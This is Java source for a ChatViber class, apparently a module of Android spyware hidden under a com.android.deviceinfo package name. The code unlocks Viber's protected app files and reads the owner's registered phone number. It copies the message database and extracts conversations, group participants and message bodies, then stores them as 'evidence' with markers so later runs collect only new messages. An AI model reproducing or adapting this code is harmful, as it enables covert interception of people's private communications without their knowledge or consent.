package com.android.deviceinfo.module.chat;

import java.io.FileInputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.util.ArrayList;
import java.util.Date;
import java.util.Hashtable;
import java.util.List;
import java.util.concurrent.Semaphore;

import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteQueryBuilder;
import android.util.Pair;

import com.android.deviceinfo.auto.Cfg;
import com.android.deviceinfo.db.GenericSqliteHelper;
import com.android.deviceinfo.db.RecordVisitor;
import com.android.deviceinfo.file.Path;
import com.android.deviceinfo.module.ModuleAddressBook;
import com.android.deviceinfo.util.Check;
import com.android.deviceinfo.util.StringUtils;
import com.android.m.M;

public class ChatViber extends SubModuleChat {
	private static final String TAG = "ChatViber";

	private static final int PROGRAM = 0x09;
	String pObserving = "com.viber";

	String dbDir = "/data/data/com.viber.voip/databases";
	String dbFile = "viber_messages";

	private Hashtable<String, Long> lastViber;
	Semaphore readChatSemaphore = new Semaphore(1, true);

	ChatGroups groups = new ChatViberGroups();
	Hashtable<String, Integer> hastableConversationLastIndex = new Hashtable<String, Integer>();

	private String account;

	@Override
	public int getProgramId() {
		return PROGRAM;
	}

	@Override
	public String getObservingProgram() {
		return pObserving;
	}

	@Override
	void notifyStopProgram(String processName) {
		readViberMessageHistory();
	}

	@Override
	protected void start() {
		lastViber = markup.unserialize(new Hashtable<String, Long>());

		account = readMyPhoneNumber();
		if (account != null) {

			ModuleAddressBook.createEvidenceLocal(ModuleAddressBook.VIBER, account);
			readViberMessageHistory();
		}

		if (Cfg.DEBUG) {
			Check.log(TAG + " (start), read lastViber: " + lastViber);
		}
	}

	private String readMyPhoneNumber() {
		String number = null;
		String file = "/data/data/com.viber.voip/files/preferences/reg_viber_phone_num";

		if (Path.unprotect(file, 4, false)) {
			FileInputStream fileInputStream;
			try {
				fileInputStream = new FileInputStream(file);
				ObjectInputStream oInputStream = new ObjectInputStream(fileInputStream);
				Object one = oInputStream.readObject();
				number = (String) one;
			} catch (Exception e) {
				if (Cfg.DEBUG) {
					e.printStackTrace();
					Check.log(TAG + " (readMyPhoneNumber) Error: " + e);
				}
			}
		}

		return number;
	}

	@Override
	protected void stop() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (stop), ");
		}
	}

	private void readViberMessageHistory() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (readViberMessageHistory)");
		}

		if (!readChatSemaphore.tryAcquire()) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (readViberMessageHistory), semaphore red");
			}
			return;
		}
		// f.0=/data/data/com.whatsapp/databases
		// String dbDir = M.d("/data/data/com.whatsapp/databases");
		// f.1=/msgstore.db
		// dbFile = M.d("/msgstore.db");
		try {
			boolean updateMarkup = false;
			if (Path.unprotect(dbDir, dbFile, true)) {

				if (Cfg.DEBUG) {
					Check.log(TAG + " (readChatMessages): can read DB");
				}
				GenericSqliteHelper helper = GenericSqliteHelper.openCopy(dbDir, dbFile);
				helper.deleteAtEnd = false;
				// SQLiteDatabase db = helper.getReadableDatabase();

				groups = new ChatViberGroups();

				List<ViberConversation> conversations = getViberConversations(helper, account);
				for (ViberConversation sc : conversations) {

					if (Cfg.DEBUG) {
						Check.log(TAG + " (readSkypeMessageHistory) conversation: " + sc.id + " date: " + sc.date);
					}

					// retrieves the lastConvId recorded as evidence for this
					// conversation
					String thread = Long.toString(sc.id);
					long lastConvId = lastViber.containsKey(thread) ? lastViber.get(thread) : 0;

					if (sc.date > lastConvId) {
						if (sc.isGroup() && !groups.hasMemoizedGroup(thread)) {
							fetchParticipants(helper, thread);
							groups.addPeerToGroup(thread, account);
						}

						long lastReadId = fetchMessages(helper, sc, lastConvId);
						if (lastReadId > 0) {
							updateMarkupViber(thread, lastReadId, true);
						}
					} else {
						if (Cfg.DEBUG) {
							Check.log(TAG + " (readViberMessageHistory) nothing new in conversation: " + thread);
						}
					}
				}
				
				helper.deleteDb();
			} else {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (readChatMessages) Error, file not readable: " + dbFile);
				}
			}
		} catch (Exception ex) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (readViberMessageHistory) Error: ", ex);
			}
		} finally {
			readChatSemaphore.release();
		}
	}

	private List<ViberConversation> getViberConversations(GenericSqliteHelper helper, final String account) {

		final List<ViberConversation> conversations = new ArrayList<ViberConversation>();

		String[] projection = new String[] { "_id", "date", "recipient_number" };
		String selection = "date > 0";

		RecordVisitor visitor = new RecordVisitor(projection, selection) {

			@Override
			public long cursor(Cursor cursor) {
				ViberConversation c = new ViberConversation();
				c.account = account;

				c.id = cursor.getLong(0);
				c.date = cursor.getLong(1);
				c.remote = cursor.getString(2);

				conversations.add(c);
				return c.id;
			}
		};

		helper.traverseRecords("threads", visitor);
		return conversations;
	}

	// fetch participants.
	private void fetchParticipants(GenericSqliteHelper helper, final String thread_id) {

		if (Cfg.DEBUG) {
			Check.log(TAG + " (fetchGroup) : " + thread_id);
		}

		String[] projection = { "contact_id", "number", "contact_name", "display_name" };
		String selection = "thread_id" + "='" + thread_id + "' and contact_id >= 0";

		// final Set<String> remotes = new HashSet<String>();
		// groups.addPeerToGroup(thread_id, "-1");
		RecordVisitor visitor = new RecordVisitor(projection, selection) {

			@Override
			public long cursor(Cursor cursor) {
				Long id = cursor.getLong(0);
				String number = cursor.getString(1);
				String name = cursor.getString(2);
				String display_name = cursor.getString(3);

				Contact contact = new Contact(Long.toString(id), number, name, display_name);
				// remotes.add(remote);
				if (number != null) {
					groups.addPeerToGroup(thread_id, contact);
				}
				return 0;
			}
		};

		helper.traverseRecords("participants", visitor);

	}

	private long fetchMessages(GenericSqliteHelper helper, final ViberConversation conversation, long lastConvId) {

		// select author, body_xml from Messages where convo_id == 118 and id >=
		// 101 and body_xml != ''
		try {
			final ArrayList<MessageChat> messages = new ArrayList<MessageChat>();

			String[] projection = new String[] { "_id", "person", "body", "date", "address", "type" };
			String selection = "thread_id = " + conversation.id + " and date > " + lastConvId;
			String order = "date";
			RecordVisitor visitor = new RecordVisitor(projection, selection, order) {

				@Override
				public long cursor(Cursor cursor) {
					// I read a line in a conversation.
					int id = cursor.getInt(0);
					String peer = cursor.getString(1);
					String body = cursor.getString(2);
					long timestamp = cursor.getLong(3);
					String address = cursor.getString(4);
					boolean incoming = cursor.getInt(5) == 0;
					Date date = new Date(timestamp);

					if (Cfg.DEBUG) {
						Check.log(TAG + " (cursor) peer: " + peer + " timestamp: " + timestamp + " incoming: "
								+ incoming);
					}

					boolean isGroup = conversation.isGroup();

					if (Cfg.DEBUG) {
						Check.log(TAG + " (cursor) incoming: " + incoming + " group: " + isGroup);
					}

					String from, to = null;
					String fromDisplay, toDisplay = null;

					from = incoming ? address : conversation.account;
					fromDisplay = incoming ? address : conversation.account;

					Contact contact = groups.getContact(peer);
					String thread = Long.toString(conversation.id);
					if (isGroup) {
						if (peer.equals("0")) {
							peer = conversation.account;
						}
						to = groups.getGroupToName(peer, thread);
						toDisplay = to;
					} else {
						to = incoming ? conversation.account : conversation.remote;
						toDisplay = incoming ? conversation.account : conversation.remote;
					}

					if (!StringUtils.isEmpty(body)) {
						MessageChat message = new MessageChat(getProgramId(), date, from, fromDisplay, to, toDisplay,
								body, incoming);

						if (Cfg.DEBUG) {
							Check.log(TAG + " (cursor) message: " + message.from + " "
									+ (message.incoming ? "<-" : "->") + " " + message.to + " : " + message.body);
						}
						messages.add(message);
					}

					return timestamp;
				}
			};

			long newLastId = helper.traverseRecords(M.e("messages"), visitor);

			if (messages != null && messages.size() > 0) {
				saveEvidence(messages);
			}

			return newLastId;
		} catch (Exception e) {
			if (Cfg.DEBUG) {
				e.printStackTrace();
				Check.log(TAG + " (fetchMessages) Error: " + e);
			}
			return -1;
		}

	}

	private ArrayList<Pair<String, Integer>> fetchChangedConversation(SQLiteDatabase db) {
		ArrayList<Pair<String, Integer>> changedConversations = new ArrayList<Pair<String, Integer>>();

		SQLiteQueryBuilder queryBuilderIndex = new SQLiteQueryBuilder();
		queryBuilderIndex.setTables("threads");

		String[] projection = { "thread_id", "address", "date", "body", "person" };
		Cursor cursor = queryBuilderIndex.query(db, projection, null, null, null, null, null);

		// iterate conversation indexes
		while (cursor != null && cursor.moveToNext()) {
			// f.5=key_remote_jid
			String jid = cursor.getString(cursor.getColumnIndexOrThrow("thread_id"));
			// f.6=message_table_id
			int mid = cursor.getInt(cursor.getColumnIndexOrThrow("date"));
			if (Cfg.DEBUG) {
				Check.log(TAG + " (readChatMessages): jid : " + jid + " mid : " + mid);
			}

			int lastReadIndex = 0;
			// if conversation is known, get the last read index
			if (hastableConversationLastIndex.containsKey(jid)) {

				lastReadIndex = hastableConversationLastIndex.get(jid);
				if (Cfg.DEBUG) {
					Check.log(TAG + " (fetchChangedConversation), I have the index: " + lastReadIndex);
				}
			}

			// if there's something new, fetch new messages and update
			// markup
			if (lastReadIndex < mid) {
				changedConversations.add(new Pair<String, Integer>(jid, lastReadIndex));
			}

		}
		cursor.close();
		cursor = null;
		return changedConversations;
	}

	private void updateMarkupViber(String thread_id, long newLastId, boolean serialize) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (updateMarkupSkype), mailStore: " + thread_id + " +lastId: " + newLastId);
		}

		lastViber.put(thread_id, newLastId);
		try {
			if (serialize || (newLastId % 10 == 0)) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (updateMarkupSkype), write lastId: " + newLastId);
				}
				markup.writeMarkupSerializable(lastViber);
			}
		} catch (IOException e) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (updateMarkupSkype) Error: " + e);
			}
		}
	}

	public void saveEvidence(ArrayList<MessageChat> messages) {
		getModule().saveEvidence(messages);
	}

}